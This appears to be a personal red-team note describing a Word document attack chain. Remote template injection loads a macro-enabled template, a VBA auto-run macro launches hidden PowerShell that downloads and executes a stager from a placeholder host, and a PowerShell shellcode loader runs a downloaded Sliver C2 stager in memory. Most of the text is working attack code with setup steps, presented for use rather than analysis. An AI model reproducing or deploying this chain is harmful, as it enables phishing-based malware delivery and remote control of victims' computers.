## Template Injection
* user downloads a benign .docx
* .docx has a template which calls out and downloads a macro enabled template
* template downloads stager
* stager downloads beacon
* ballin

1. create a document with a template and save it as a .docx
2. unzip the file and edit doc/\_rels/settings.xml
	* serve a .dotm template on a host with a malicious macro
	* point the template target in the xml to your host where the .dotm is hosted

## Macros
* VBA script macro runs the commands we want
* powershell stager downloads a stager from sliver
* stager downloads the beacon

### VBA Macro
```vba
Sub AutoOpen()
    ballsack
End Sub
Sub Document_Open()
    ballsack
End Sub

Sub ballsack()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<location of stager>/<stager file>'))"""
    Set wsh = Nothing
End Sub
```
* powershell cradle that uses powershell to download another powershell script that downloads the beacon
### Powershell Stager
```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);
[DllImport("kernel32", CharSet=CharSet.Ansi)]
public static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    IntPtr lpThreadId);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(
    IntPtr hHandle,
    UInt32 dwMilliseconds);
}
"@
Add-Type $Win32

$shellcode = (New-Object System.Net.WebCLient).DownloadData("SLIVER STAGER")
if ($shellcode -eq $null) {Exit};
$size = $shellcode.Length

[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```